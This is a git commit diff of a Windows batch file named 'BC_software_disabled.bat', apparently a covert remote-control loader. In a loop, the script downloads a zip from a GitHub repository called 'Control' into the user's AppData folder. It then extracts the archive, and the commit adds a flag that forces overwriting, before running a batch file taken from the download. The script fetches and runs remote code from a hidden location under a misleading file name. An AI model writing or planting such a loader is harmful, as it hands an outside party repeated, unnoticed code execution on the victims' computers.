d87a050107d7ed1d9e61d1877868aa8aa0430645
Guest257351 <lukenicholls510@gmail.com>
2021-03-31 15:39:20 +1030

    updates

--- BC_software_disabled.bat
+++ BC_software_disabled.bat
@@ -2,7 +2,7 @@ cd C:\users\%username%\AppData
 powershell Import-Module BitsTransfer
 :begin
 powershell Start-BitsTransfer -source "https://github.com/Guest257351/Control/archive/refs/heads/main.zip" -Destination data.zip
-powershell Expand-Archive data.zip C:\users\%username%\AppData\scripts
+powershell Expand-Archive data.zip C:\users\%username%\AppData\scripts -force
 cd C:\Users\%username%\AppData\scripts\Control-main
 timeout 1 /NOBREAK >nul
 call REPtxt.bat
